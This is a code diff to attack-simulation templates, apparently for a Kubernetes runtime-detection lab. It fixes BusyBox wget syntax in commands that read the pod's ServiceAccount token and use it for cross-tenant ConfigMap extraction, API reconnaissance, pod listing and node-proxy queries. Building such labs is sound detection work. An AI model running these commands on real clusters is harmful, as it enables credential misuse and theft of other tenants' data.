@@ -555,10 +555,12 @@ ROUND2_TEMPLATES: list[dict[str, Any]] = [
         # ServiceAccount-authenticated cross-tenant ConfigMap extraction.
         # No D-29 observation added: this template already produces Hubble
         # flow telemetry through its own API request (observation type C).
+        # BusyBox wget supports only `--header`, never `-H`; the short form
+        # aborts before any network request is made.
         # proc.cmdline length: 181 -> bin 151-250+
         "command": (
             "T=$(cat /run/secrets/kubernetes.io/serviceaccount/token);"
-            'wget -qO- --no-check-certificate -H "Authorization: Bearer $T" '
+            'wget -qO- --no-check-certificate --header="Authorization: Bearer $T" '
             "https://10.96.0.1/api/v1/namespaces/tenant-b/configmaps"
         ),
         "sleep_after": 6,
@@ -575,15 +577,22 @@ ROUND2_TEMPLATES: list[dict[str, Any]] = [
         "namespace": "tenant-b",
         "app": "api",
         "mode": "exec",
-        # Re-scoped (proposed): ServiceAccount-authenticated API group
-        # discovery, i.e. reconnaissance of the full authorization surface
-        # using the workload's own identity.  The request is attributed to the
-        # pod ServiceAccount in the audit log.
-        # proc.cmdline length: 148 -> bin 81-150
+        # Re-scoped (proposed): ServiceAccount-authenticated API discovery,
+        # i.e. reconnaissance of the authorisation surface using the workload's
+        # own identity.  The request is attributed to the pod ServiceAccount
+        # in the audit log.
+        # Two facts shape this command:
+        #   * BusyBox wget supports only `--header`, never `-H`; the short form
+        #     aborts before any network request is made.
+        #   * with the working `--header=` form the shortest
+        #     ServiceAccount-authenticated, audit-attributable request is 153
+        #     characters, so this template cannot occupy the 81-150 bin.  That
+        #     is a measured property of the lab, not a design choice.
+        # proc.cmdline length: 153 -> bin 151-250+
         "command": (
             "T=$(cat /run/secrets/kubernetes.io/serviceaccount/token);"
-            'wget -qO- --no-check-certificate -H "Authorization: Bearer $T" '
-            "https://10.96.0.1/apis"
+            'wget -qO- --no-check-certificate --header="Authorization: Bearer $T" '
+            "https://10.96.0.1/api"
         ),
         "sleep_after": 7,
         "expected_cpu_profile": "low",
@@ -603,10 +612,11 @@ ROUND2_TEMPLATES: list[dict[str, Any]] = [
         # namespace.  The lab grants the tenant ServiceAccount no RBAC, so the
         # response is 403 even for the own namespace; the class signal is the
         # own-namespace target, not the status code.
-        # proc.cmdline length: 175 -> bin 151-250+
+        # BusyBox wget supports only `--header`, never `-H`.
+        # proc.cmdline length: 181 -> bin 151-250+
         "command": (
             "T=$(cat /run/secrets/kubernetes.io/serviceaccount/token);"
-            'wget -qO- --no-check-certificate -H "Authorization: Bearer $T" '
+            'wget -qO- --no-check-certificate --header="Authorization: Bearer $T" '
             "https://10.96.0.1/api/v1/namespaces/tenant-b/pods"
         ),
         "sleep_after": 6,
@@ -694,11 +704,12 @@ ROUND2_TEMPLATES: list[dict[str, Any]] = [
         "app": "database",
         "mode": "exec",
         # Node proxy endpoint reconnaissance loop via the API server.
-        # proc.cmdline length: 223 -> bin 151-250+
+        # BusyBox wget supports only `--header`, never `-H`.
+        # proc.cmdline length: 229 -> bin 151-250+
         "command": (
             "T=$(cat /run/secrets/kubernetes.io/serviceaccount/token);"
             "for i in 1 2 3 4 5;do "
-            'wget -qO- --no-check-certificate -H "Authorization: Bearer $T" '
+            'wget -qO- --no-check-certificate --header="Authorization: Bearer $T" '
             "https://10.96.0.1/api/v1/nodes/runtimelens-control-plane/proxy/metrics;done"
         ),
         "sleep_after": 8,
